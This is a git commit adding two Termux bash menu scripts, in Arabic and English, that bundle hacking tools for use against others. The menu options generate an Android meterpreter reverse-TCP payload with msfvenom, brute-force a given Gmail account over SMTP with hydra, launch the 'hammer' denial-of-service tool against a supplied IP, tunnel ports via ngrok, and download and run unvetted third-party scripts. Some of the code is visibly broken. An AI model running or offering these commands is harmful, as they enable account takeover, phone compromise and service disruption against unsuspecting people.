e2dd0da57b02e62567a6ca34ca286c527fa90d4f
ahsannassr218 <46180293+ahsannassr218@users.noreply.github.com>
2019-01-16 15:20:15 +0200

    Add files via upload

---
+++ ahsan.sh
@@ -0,0 +1,171 @@
+#!/data/data/com.termux/files/usr/bin/bash
+#colors
+cyan='\033[1;36m'
+green='\033[1;32m'
+red='\033[1;31m'
+yellow='\033[1;33m'
+blue='\033[1;34m'
+purple='\033[1;35m'
+reset='\033[0m'
+sleep 0.2
+echo -e " ﺮﻛﺎﻫ
+                      $green [11]ﺖﻳﺪﺤﺗ
+___________________________________________________________________
+|$cyan [1] ﺓﺍﺩﺍ ﺖﻴﺒﺘﺗnmap🌐          |$purple  [6]payload5 ﺓﺍﺩﺍ ﺖﻴﺒﺘﺗ         |
+| [2] ﺓﺍﺩﺍ ﺖﻴﺒﺘﺗ                |$red  [7]install payload             |
+| [3]ﻲﺒﻳﻻﺍ                      |$yellow  [8]ﺔﺘﺴﻴﻟ ﻊﻨﺻ                   |
+|$reset [4] ﺝﻭﺮﺧ                      |  [9]fakecall                    |
+| [5]ﺓﺍﻭﺩﻻﺍ ﻢﻫﺍ ﺖﻴﺒﺘﺗ           |  [10] lﻴﻤﻴﺟ ﻕﺍﺮﺘﺧﺍ              |
+|                               |  [11] kﻮﺑﺲﻴﻓ ﻕﺍﺮﺘﺧﺍ             |
+|                               |  [12] ﻢﻐﻠﻣ ﻖﻴﺒﻄﺗ                |
+|+++++++++++++++++++++++++++++++_+++++++++++++++++++++++++++++++++|
+| [29l]ngrok ﺓﺍﺩﺍ ﺖﻴﺒﺘﺗ         | [33]ﺲﻜﻣﺮﻴﺗ ﻲﻓ ﻢﻴﻠﻌﺗ             |
+| [30]Tool-X ﺓﺍﺩﺍ ﺖﻴﺒﺘﺗ         | [34]English                     |
+| [31] ﺕﺎﺗﺭﻮﺑ ﺢﺘﻓ               |                                 |
+| [32]EasY__HaCk ﺓﺍﺩﺍ ﺖﻴﺒﺘﺗ     |                                 |
+|$purple [55]ﺔﺠﻋﺰﻣ ﺕﻻﺎﺼﺗ               |                                 |
+|                          |[88]ﺓﺪﻋﺎﺴﻣ |                          |
+$yellow|_________________________________________________________________|
+|     |kﻮﺒﺴﻴﻓ ﺕﺎﻏﻼﺑﺍ|      |          |kﻮﺒﺴﻴﻓ ﺕﺎﻜﻳﻻ ﻊﻗﺍﻮﻣ|        |
+|==========================|======================================|
+|                          |                                      |
+|[13] Lﻔﻄﻟﺍ ﺕﺮﻐﺗ           | [21]ﺕﺎﺑﺎﺠﻋﺍ ﺓﺩﺎﻳﺯ ﻊﻗﻮﻣ      [25]like |
+$red|                          | [22]ﺕﺎﺑﺎﺠﻋﺍ ﺓﺩﺎﻳﺯ ﻊﻗﻮﻣ      [26]like |
+|                          | [23]ﺕﺎﺑﺎﺠﻋﺍ ﺓﺩﺎﻳﺯ ﻊﻗﻮﻣ      [27]like |
+$purple|                          $blue| [24]ﺕﺎﺑﺎﺠﻋﺍ ﺓﺩﺎﻳﺯ ﻊﻗﻮﻣ               |
+|                          |             ____________             |
+|       [77]ﺏﻮﻴﺗﻮﻳ         |             |[00]Kﻮﺒﺴﻴﻓ|             |
+|__________________________|______________________________________|
+        ﺪﻳﺪﺟ ﻞﻛ ﻚﻠﺼﻴﻟ ﻲﺗﺎﻨﻗ ﻊﺑﺎﺗ ﺓﺍﺩﻻﺍ ﺖﻳﺪﺤﺗ ﻢﺘﻴﺳ ﻉﻮﺒﺳﺍ ﺪﻌﺑ
+                           ﺍﺮﻜﺷﻭ
+$blue
+"
+echo "{+===============+}"
+curl ifconfig.me
+echo -e "$blue"
+ifconfig wlan0 | grep -o 192..........
+#echo -e "$green "
+echo "{======my=====ip=====}"
+date
+read -p "number=====>>" u
+if [ $u -eq 1 ]; then
+pkg install nmap
+fi
+if [ $u -eq 2 ]; then
+wget https://Auxilus.github.io/metasploit.sh
+bash metasploit.sh
+fi
+if [ $u -eq 4 ]; then
+figlet GOOD BAY
+echo  " ﺔﻣﻼﺴﻟﺍ ﺎﻌﻣ"
+exit
+fi
+if [ $u -eq 5 ]; then
+pkg install python
+pkg install python2
+pkg install wget
+pkg install git
+pkg install nano
+fi
+if [ $u -eq 6 ]; then
+git clone https://github.com/Ali898989/setupp
+cd setupp
+chmod +x setup.sh
+/setup.sh
+fi
+if [ $u -eq 55 ]; then
+cd thebast
+chmod +x *
+php 'ahsan.php '
+fi
+if [ $u -eq 9 ]; then
+date
+time
+fi
+if [ $u -eq 88 ]; then
+date
+echo -e "$red========>> ﺢﺋﺎﺴﻟﺍ ﻥﺎﺴﺣﺍ"
+echo -e "$blue==========>> ﺎﻴﺒﻴﻟ"
+fi
+if [ $u -eq 00 ]; then
+termux-open https://www.facebook.com/profile.php?id=100025128256916
+fi
+if [ $u -eq 13 ]; then
+termux-open https://m.facebook.com/help/contact/209046679279097
+fi
+if [ $u -eq 11 ]; then
+cd $HOME/thebast/aa.py
+chmod +x *
+python aa.py
+fi
+if [ $u -eq 8 ]; then
+git clone https://github.com/Mebus/cupp
+chmod +x *
+./cupp.py -i
+fi
+if [ $u -eq 22 ]; then
+termux-open http://facefuck.pro/
+fi
+if [ $u -eq 21 ]; then
+termux-open https://s2.freefollowersandlikes.net
+fi
+if [ $u -eq 23 ]; then
+termux-open http://bestfollow.pro/
+fi
+if [ $u -eq 24 ]; then
+termux-open http://getsub.top/
+fi
+if [ $u -eq 12 ]; then
+read -p "$red your host===>> " host
+read -p " your port===>> " port
+read -p "entar output====>> " output
+msfvenom -p android/meterpreter/reverse_tcp LHOST=${host} LPORT=${port} -o 
+${output}
+fi
+if [ $u -eq 10 ]; then
+clear
+read -p "Email =====>>" Email
+read -p "listpassword =======>>" $listpassword
+hydra -S -l Email=${Email} -P /sdcard/listpassword=${listpassword}-v -V -e ns -s 
+465 smtp$
+
+fi
+if [ $u -eq 29 ]; then
+echo "ﺲﻜﻣﺮﻴﺗ ﻲﻟ ﻞﻘﻧﺍ ﻞﻳﺰﻨﺘﻟﺍ ﻢﺘﻳﺎﻣ ﺪﻌﺑ ngrok-stable-linux-arm.zip ﻒﻠﻣ ﻝﺰﻧ ﻢﺗ ﻊﻗﻮﻤﻟﺍ" 
+sleep 1
+echo "تم ﻞﺠ"
+sleep 2
+echo "ﻩﺪﻳﺮﻧ ﻱﺪﻟﺍ ﺕﺭﻮﺒﻟﺍ ﻊﻀﻧ ﻊﻀﻧ ﺎﻨﻫﻭ ﺎﻨﻟ ﺮﻬﻈﺗ ﺎﻫﺪﻌﺑ ﻒﻠﻤﻟﺍ ﻢﺳﺍ ﺎﻫﺪﻌﺑunzip ﻲﺑ ﻲﻠﻋ"
+sleep 1
+echo "ﻂﻐﻀﻟﺍ ﻚﻓ"
+read -p ">>>>Entar<<<<<"
+termux-open http://ngrok.com
+fi
+if [ $u -eq 30 ]; then
+git clone https://github.com/Rajkumrdusad/Tool-X
+cd Tool-X
+chmod +x install.aex
+sh install.aex
+Tool-X
+fi
+if [ $u -eq 77 ]; then
+termux-open https://www.youtube.com/channel/UCI3o4rr8EJVes4drV_64SRQ
+fi
+if [ $u -eq 31 ]; then
+read -p "port=======>>>" port
+cd $HOME
+./ngrok tcp ${port}
+fi
+
+if [ $u -eq 34 ]; then
+clear
+bash thebast.sh
+fi 
+if [ $u -eq 32 ]; then
+clear
+git clone https://github.com/sabri-zaki/EasY_HaCk
+cd EasY_HaCk /
+chmod +x install.sh
+EasY-HaCk
+fi 
+bash ahsan.sh
---
+++ thebast.sh
@@ -0,0 +1,237 @@
+#!/data/data/com.termux/files/usr/bin/bash  
+#colors
+cyan='\033[1;36m'
+green='\033[1;32m'
+red='\033[1;31m'
+yellow='\033[1;33m'
+blue='\033[1;34m'
+purple='\033[1;35m'
+reset='\033[0m'
+echo "                scrpt AHSAN ALSAEH" 
+     echo -e "$cyan!!======================>=>>>>>" $name  "<<<<<========================!!" 
+      date
+echo -e "$red
+
+                           
+    
+$purple======================================||
+                                      ||
+         #################            ||    ###############
+         # Ahsan by sofi #            ||    # AHSAN ALSAEH#
+         #################            ||    ###############
+$red                                   \  ||  /
+                     __________     \ || /
+                    /            \   \||/                                  
+                   |    sofi      |   \/
+                   |,  .-.  .-.  ,|        
+                   | )(_ /  \_ )( |
+                   |/     /\     \|    
+         (@_)      <__    ^^    __>          {1.0.0}
+    _     ) \_______\__|IIIIII|__/__________________________
+   (_)\e[______________________________/_____/_______/___>_/ 
+          )_/         \ IIIIII /                    
+         (@)           --------                        
+$green
+                         🎧🎤🔔🔕🔇🔈📯🔊🎸☎️📞
+
+                             T$cyan H$purple E$red B$green A$blue S$yellow T$reset                     
+
+$blue        |________________________________________________________|
+                  
+        
+$green                           [11]update
+  ___________________________________________________________________
+  |$cyan  [1]install nmap🌐            |$purple          [6]payload5            |
+  |  [2]install metaspilt📱       |$red          [7]install payload     |
+  |  [3]my ip📤                   |$yellow          [8]cupp                |       
+ $reset |  [4]exit                      |          [9]fakecall            |
+  |  [5]install python🕵️‍♂️          |          [10]HACKER Gmail       |
+  |                               |          [11]HACKER FACEBOOK    |
+  |                               |          [12]payload metaspilt  |
+  |+++++++++++++++++++++++++++++++_+++++++++++++++++++++++++++++++++|
+  |  [29l]ngrok                   | [33]ﺲﻜﻣﺮﻴﺗ ﻲﻓ ﻢﻴﻠﻌﺗ             |
+  |  [30]Tool-X                   | [34]ﺔﻴﺑﺮﻌﻟﺍ ﺔﻐﻟﺍ                |
+  |  [31]open port                | [35]Hitler                      |
+  |  [32]EasY__HaCk               |                                 |
+  |$purple  [55]send call to *********   |                                 |
+  |  [56]Hunner                 |[88]help|                           |
+ $yellow |+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++|
+  | Communication  FACEBOOK  |              like facebook           |
+  |==========================|===================================== |
+  |                          |       like facebook                  |
+  |[13]Child communication   |  [21]like             [25]like       |
+ $red |                          |$reset  [22]coment           [26]like       |
+  |                          |  [23]like             [27]like       |
+ $purple |                    $red      |  [24]like                            |
+  |                          |                                      |
+  |        [77]Youtube       |             [00]facebook             |
+  |__________________________|______________________________________|
+         ﺪﻳﺪﺟ ﻞﻛ ﻚﻠﺼﻴﻟ ﻲﺗﺎﻨﻗ ﻊﺑﺎﺗ ﺓﺍﺩﻻﺍ ﺖﻳﺪﺤﺗ ﻢﺘﻴﺳ ﻉﻮﺒﺳﺍ ﺪﻌﺑ
+                               ﺍﺮﻜﺷﻭ
+$blue
+"
+sleep 1
+echo -e "$red{=======my$blue========ip$green==========}"
+       curl ifconfig.me
+echo -e "$blue"
+ifconfig wlan0 | grep -o 192..........
+#echo -e "$green "
+echo -e "{======$blue=======$green========$red=========}"
+
+date
+read -p "number=====>>"  u
+if [ $u -eq 1  ]; then
+clear
+pkg install nmap 
+fi
+if [ $u  -eq 2  ]; then
+clear
+wget https://Auxilus.github.io/metasploit.sh
+bash metasploit.sh
+
+fi
+if [ $u -eq 3 ]; then
+
+echo -e "$red{=======my$blue=========ip$green============}"
+curl ifconfig.me
+echo -e "$blue"
+ifconfig wlan0 | grep -o 192..........
+echo -e "{======$blue========$green==========$red=========}"
+
+
+fi
+if [ $u  -eq 4 ]; then
+figlet GOODBAY
+exit
+fi
+if [ $u  -eq 5  ]; then
+pkg install python
+pkg install python2
+pkg install wget
+pkg install git
+pkg install nano 
+fi
+if [ $u  -eq 6  ]; then
+clear
+git clone https://github.com/Ali898989/setupp
+cd setupp
+chmod +x setup.sh
+/setup.sh
+clear
+fi
+if [ $u  -eq 55  ]; then
+clear
+cd thebast 
+chmod +x *
+php 'ahsan.php '
+fi
+if [ $u -eq 9 ]; then
+clear
+date
+time
+fi
+if [ $u -eq 88 ]; then
+clear
+date
+echo -e "$red===$blue====$green=>>AHSAN Alsaeh <<$red====$blue====$green====="
+echo -e "$blue==$red=====$green=====>> ﺎﻴﺒﻴﻟ <<==$blue====$red====$green====="
+fi
+if [ $u -eq 00 ]; then
+termux-open  https://www.facebook.com/profile.php?id=100025128256916
+fi 
+if [ $u -eq 13 ]; then 
+clear
+termux-open https://m.facebook.com/help/contact/209046679279097
+fi
+if [ $u -eq 11 ]; then
+clear
+echo -e ">>>>>>>>>$blueﺓﺍﺩﻻﺍ ﺖﻳﺪﺤﺗ ﻢﺘﻴﺳ<<<<<<<<<"
+echo -e         ">>>>>>>>>>>>>>>>$redﺍﺮﻜﺷﻭ<<<<<<<<<<<<<<<<<"
+fi
+if [ $u -eq 8 ]; then
+git clone https://github.com/Mebus/cupp
+cd thebast
+chmod +x *
+./cupp.py -i
+fi
+if [ $u -eq 22 ]; then
+clear
+termux-open http://facefuck.pro/
+fi
+if [ $u -eq 21 ]; then
+clear
+termux-open https://s2.freefollowersandlikes.net
+fi
+if [ $u -eq 23 ]; then 
+clear
+termux-open http://bestfollow.pro/
+fi 
+if [ $u -eq 24 ]; then
+clear
+termux-open http://getsub.top/
+fi 
+if [ $u -eq 12 ]; then
+clear
+read -p "$red your host===>> " host
+read -p " your port===>> " port
+read -p "entar output====>> " output
+msfvenom -p android/meterpreter/reverse_tcp LHOST=${host} LPORT=${port} -o ${output}
+fi
+if [ $u -eq 10 ]; then
+clear
+read -p "Email =====>>" Email
+read -p "listpassword =======>>" $listpassword
+hydra -S -l Email=${Email} -P /sdcard/listpassword=${listpassword}-v -V -e ns -s 465 smtp.gmail.com smtp
+fi
+if [ $u -eq 29 ]; then
+clear
+echo ﺲﻜﻣﺮﻴﺗ ﻲﻟ ﻞﻘﻧﺍ ﻞﻳﺰﻨﺘﻟﺍ ﻢﺘﻳﺎﻣ ﺪﻌﺑ ngrok-stable-linux-arm.zip  ﻒﻠﻣ ﻝﺰﻧ ﻢﺗ ﻊﻗﻮﻤﻟﺍ تم ﻞﺠﺳﻭ ﺐﻫﺩﺍ ﻝﻭﺍ 
+echo   ﻩﺪﻳﺮﻧ ﻱﺪﻟﺍ ﺕﺭﻮﺒﻟﺍ ﻊﻀﻧ ﻊﻀﻧ ﺎﻨﻫﻭ ﺎﻨﻟ ﺮﻬﻈﺗ ﺎﻫﺪﻌﺑ ﻒﻠﻤﻟﺍ ﻢﺳﺍ ﺎﻫﺪﻌﺑunzip ﻲﺑ ﻲﻠﻋ ﻂﻐﻀﻟﺍ ﻚﻓ ﺎﻫﺪﻌﺑ ﺲ
+read -p ">>>>Entar<<<<<"
+termux-open http://ngrok.com 
+fi 
+if [ $u -eq 30 ]; then 
+clear
+git clone https://github.com/Rajkumrdusad/Tool-X
+cd Tool-X
+chmod +x install.aex
+sh install.aex
+Tool-X
+fi 
+if [ $u -eq 77 ]; then
+clear
+termux-open https://www.youtube.com/channel/UCI3o4rr8EJVes4drV_64SRQ
+fi 
+if [ $u -eq 31 ]; then
+clear
+read -p  "port=======>>>" port  
+cd $HOME 
+./ngrok tcp ${port} 
+fi
+if [ $u -eq 34 ]; then
+clear
+echo -e "$red"
+figlet -f big "ERROR"
+sleep 0.8
+bash ahsan.sh 
+fi 
+if [ $u -eq 35 ]; then
+clear 
+termux-open 'اغنية_هتلر_المشهور_بالعالم_(Hitler).mp3'
+fi 
+if [ $u -eq 56 ]; then 
+clear
+read -p "ip/link ==========>>>"  ${ip/link} 
+read -p "port/80 ==========>>>"  ${port/80}
+read -p "Time in seconds========>>>"  ${Time}
+git clone https://github.com/cyweb/hammer.git
+chmod +x *
+python hummer.py -s ${ip/link} -p ${port/80} -t ${Time}
+fi
+if [ $u -eq 32 ]; then 
+git clone https://github.com/sabri-zaki/EasY_HaCk
+cd EasY_HaCk /
+chmod +x install.sh
+EasY-HaCk
+fi
+bash thebast.sh
